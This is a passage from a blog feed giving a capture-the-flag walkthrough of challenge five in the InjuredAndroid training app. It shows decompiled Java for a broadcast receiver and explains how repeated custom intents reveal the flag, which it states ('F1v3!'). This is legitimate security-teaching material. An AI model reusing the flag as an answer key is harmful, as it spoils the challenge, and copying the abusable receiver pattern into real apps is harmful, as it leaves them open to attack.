        &lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;FloatingActionButton&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;fab&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;// from class: b3nac.injuredandroid.c
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            @Override &lt;span style=&#34;color:#6272a4&#34;&gt;// android.view.View.OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                FlagFiveActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4118G&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;  
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;});&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ComponentName&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; FlagFiveReceiver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        getPackageManager&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        C0310a&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m8404b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m8403c&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4409x&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; IntentFilter&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;Button&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;button9&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;// from class: b3nac.injuredandroid.b
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            @Override &lt;span style=&#34;color:#6272a4&#34;&gt;// android.view.View.OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                FlagFiveActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4117H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;   &lt;span style=&#34;color:#6272a4&#34;&gt;// invokes the intent
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;});&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above code, when we click flag2 button, we invoke intent which is defined in class  &lt;em&gt;&lt;strong&gt;m4117H&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;An intent is used to perfom an action on the screen. Therefore clicking the button element in our application we are invoking an new intent. Intents are used for sending a broadcast receiver.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;/* renamed from: H */&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#6272a4&#34;&gt;/* synthetic */&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;m4117H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        m4119F&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;m4119F&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        sendBroadcast&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; Intent&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the component name  &lt;strong&gt;FlagFiveReceiver&lt;/strong&gt; class. when the intent is invoked twice, we receive our flag. The class implements a conditional if else loop for checking the number of intents. when the correct flag is displayed, the intents counter is set to zero( &lt;em&gt;i2 = 0)&lt;/em&gt;, where i2 variable is the intent counter as shown in the java code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;FlagFiveReceiver&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;extends&lt;/span&gt; BroadcastReceiver &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color:#6272a4&#34;&gt;/* renamed from: a */&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;int&lt;/span&gt; f4410a&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;

    @Override &lt;span style=&#34;color:#6272a4&#34;&gt;// android.content.BroadcastReceiver
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onReceive&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;Context context&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; Intent intent&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        String str&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m881e&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;context&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m881e&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;intent&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;intent&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;f4506j&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4062a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#8be9fd&#34;&gt;int&lt;/span&gt; i2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; f4410a&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;i2 &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            StringBuilder sb &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; StringBuilder&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
            sb&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;C2765h&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m809e&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;\n    Action: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; intent&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;getAction&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;\n\n    &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
            sb&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;C2765h&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m809e&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;\n    URI: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; intent&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toUri&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;\n\n    &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
            str &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; sb&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
            C2724g&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m882d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;str&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;sb.toString()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
            Log&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DUDE!:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; str&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            str &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Keep trying!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;i2 &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;i2 &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 2&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
                    &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; FlagsOverview&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4087H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
                    &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ApplicationC1492j&lt;span style=&#34;color:#ff79c6&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4065b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flagFiveButtonColor&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
                    Toast&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;You are a winner &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; C1494k&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m4061a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Zkdlt0WwtLQ=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;),&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
                    i &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
                    f4410a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
                &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
                Toast&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; str&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
        Toast&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; str&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        i &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; f4410a &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; 1&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        f4410a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;onReceive&lt;/strong&gt; method is responsible for receiving intents sent. Invoking our Activity two times we get a flag.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/flag5.png&#34; &gt;
		&lt;img src=&#34;https://raw.githubusercontent.com/thuri10/images-blog/development/android/flag5.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Flag Five&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag Five&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The flag for challenge five is &lt;strong&gt;F1v3!&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
